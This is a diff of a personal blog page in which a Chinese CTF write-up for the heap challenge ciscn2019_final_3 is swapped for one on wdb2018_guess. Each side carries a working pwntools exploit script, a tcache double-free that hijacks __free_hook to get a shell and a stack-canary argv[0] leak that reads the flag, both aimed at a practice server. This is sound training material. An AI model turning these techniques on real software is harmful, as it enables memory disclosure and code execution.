@@ -15,17 +15,20 @@
 
 
 
-<meta name="description" content="buu刷题记录：ciscn_final_3">
+<meta name="description" content="buu刷题记录：wdb2018_guess">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn2019_final_3 writeup">
-<meta property="og:url" content="http://example.com/2021/11/01/ciscn2019_final_3%20writeup/index.html">
+<meta property="og:title" content="wdb2018_guess writeup">
+<meta property="og:url" content="http://example.com/2021/11/04/wdb2018_guess%20writeup/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="buu刷题记录：ciscn_final_3">
+<meta property="og:description" content="buu刷题记录：wdb2018_guess">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-11-01T14:00:00.000Z">
-<meta property="article:modified_time" content="2021-11-01T15:26:46.610Z">
+<meta property="og:image" content="http://example.com/2021/11/04/wdb2018_guess%20writeup/1.png">
+<meta property="og:image" content="http://example.com/2021/11/04/wdb2018_guess%20writeup/2.png">
+<meta property="article:published_time" content="2021-11-04T03:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-04T07:45:04.195Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/11/04/wdb2018_guess%20writeup/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>ciscn2019_final_3 writeup | xia0ji233&#39;s blog</title>
+<title>wdb2018_guess writeup | xia0ji233&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -202,11 +205,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-ciscn2019_final_3 writeup" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-wdb2018_guess writeup" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/11/01/ciscn2019_final_3%20writeup/" class="article-date">
-      <time datetime="2021-11-01T14:00:00.000Z" itemprop="datePublished">2021-11-01</time>
+      <a href="/2021/11/04/wdb2018_guess%20writeup/" class="article-date">
+      <time datetime="2021-11-04T03:00:00.000Z" itemprop="datePublished">2021-11-04</time>
 </a>
 
 
@@ -221,7 +224,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ciscn2019_final_3 writeup
+      wdb2018_guess writeup
     </h1>
   
 
@@ -242,13 +245,21 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>buu刷题记录：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p>
+        <p>buu刷题记录：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p>
 <span id="more"></span>
 
-<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天解决了C++文件换版本的问题，也是一刻没耽误直接做了这道C++题目，不得不说太爽了啊，再也不用因为题目是C++写的就做不了了，话不多说来看文件。</p>
-<h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>题目告知是ubuntu18版本的，给了libc.so.6文件，但是盲猜跟它自己的一样，那就先换好elf文件的版本。checksec观察保护全开。然后IDA打开一看，发现是经典的堆菜单题，提供了两种操作，add和delete。delete很明显free之后指针没有清零，存在UAF漏洞，并且add只允许下标开到0x18，也就是0~24总共能add 25次。然后大小限制在了fastbin大小的范围内，但是很贴心地，每次add之后给了malloc之后的地址。那么大概率通过这里泄露（ps:一开始并没有想到，还想着用IO泄露来着的），思路大概是先通过一次double free修改一个chunk的size为其它大小，然后free一次，再修改成非fastbin范围的堆块，并且防止堆块放入unsortedbin被check fail，最好不要构造堆相互重叠(这句话的意思差不多就是尽量让小堆块完全被大堆块包含，因为它会检测next chunk的)。然后出来了libc的地址之后准备好之前被free的堆块，add添加之后libc地址落入tcache中，再次add泄露这个地址，然后就很简单了，double free劫持free_hook为system函数，再free一个带有/bin/sh字符串的堆块即可getshell。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double free保存一个free的0x30堆块在0号堆块位置</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#构造非fastbin大小的堆块</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#填满tcache 使其落入unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#泄露libc地址</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#劫持freehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>checksec一下发现开了NX和canary保护，64位程序，用ida分析看看</p>
+<p>很明显的gets栈溢出，并且gets之后没有回显输入的内容，那这样的话意味着不能栈溢出劫持控制流了。那么看看前面，发现有一个把flag文件内容读到栈上面的动作。后面while循环调用了一个sub_400A11函数，v7=3，v6=0,，v7&gt;=v6 break就意味着这个函数会被调用三次。而发现sub_400A11函数是调用fork函数，fork函数会创建和当前进程一模一样的进程，然后范围自身进程的ID，如果是被创建的进程，那么fork将会返回0。</p>
+<p>简单点就是fork的子进程会返回0，如果返回0那么break执行下面的内容，父进程因为返回自己进程号不会break则继续循环，然后调用fork，也就是说这个进程一共会产生3个子进程执行while循环之后的内容。</p>
+<p>这里有一个特性，那就是在发生栈溢出之后stack_chk_fail。在终止程序之前还会打印argv[0]，这一点很合理。但是这里可以用于泄露栈上的flag，我们如果gets覆盖到argv[0]，就可以任意地址泄露了，但是因为只有三个子进程，就只能泄露三次，前两次一定要把栈地址泄露出来。但是呢现在栈地址是不知道的，我们可以先通过一次泄露泄露出libc的地址，二次泄露出栈地址，最后一次泄露flag。其实这里还有一点不太理解，就是fork之后栈是共享的嘛？libc是共享的很好理解，栈共享就不是很好理解了，还是说它栈不同，只是对应偏移的地方都有flag，然后我泄露的是别的进程上面的flag，倾向于这种解释。</p>
+<h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>现在就需要知道这个buf到底需要多少字节能覆盖argv[0]，所以需要动调一波。断点下在fork循环之后，这里我选择了0x400b0d的位置，r。为了确定buf的位置，我们选择gets读入很多个a看看它与argv[0]之间的偏移。</p>
+<p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p>
+<p>很容易可以从左边看出来，他们之间差了0x128个字节，那么payload就是0x128*b’a’+p64(要泄露内容的地址)。</p>
+<p>第一次拿下libc之后第二次应该要拿__environ，这个我也是看writeup知道的，这个好像就是指向argv[0]的地址。也就是栈上的地址，这个是在libc里面的，所以拿到libc之后就可以泄露这个，然后再观察泄露的地址和flag的地址差多少，确定好偏移之后第三次就可以直接泄露flag了，这里测试之后是0x168的偏移，泄露的地址再减去0x168就是我们想要的flag了。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>成功getflag</p>
+<p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>
 
       
     </div>
@@ -257,13 +268,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/11/01/ciscn2019_final_3%20writeup/">ciscn2019_final_3 writeup</a></p>
+        <p><span>本文标题:</span><a href="/2021/11/04/wdb2018_guess%20writeup/">wdb2018_guess writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
-        <p><span>发布时间:</span>2021-11-01, 22:00:00</p>
-        <p><span>最后更新:</span>2021-11-01, 23:26:46</p>
+        <p><span>发布时间:</span>2021-11-04, 11:00:00</p>
+        <p><span>最后更新:</span>2021-11-04, 15:45:04</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/11/01/ciscn2019_final_3%20writeup/" title="ciscn2019_final_3 writeup">http://example.com/2021/11/01/ciscn2019_final_3%20writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/11/01/ciscn2019_final_3%20writeup/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/11/04/wdb2018_guess%20writeup/" title="wdb2018_guess writeup">http://example.com/2021/11/04/wdb2018_guess%20writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/11/04/wdb2018_guess%20writeup/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -275,16 +286,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/11/02/WUSTCTF2020%20level4%20writeup/">
-                    
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/">
-                    关于C++文件换libc版本的问题
+                <a href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/">
+                    网鼎杯2020青龙组singal writeup
                 </a>
             </div>
         
@@ -296,7 +301,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90elf%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">静态分析elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90elf%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">静态分析elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"><span class="toc-number">2.</span> <span class="toc-text">动态调试确定偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
         
     </div>
     <style>
@@ -332,7 +337,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"ciscn2019_final_3 writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"wdb2018_guess writeup　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -352,15 +357,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/11/02/WUSTCTF2020%20level4%20writeup/" title="上一篇: ">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/" title="下一篇: 关于C++文件换libc版本的问题">
+            <a href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/" title="下一篇: 网鼎杯2020青龙组singal writeup">
                 <i class="fa fa-angle-right"></i>
             </a>
         
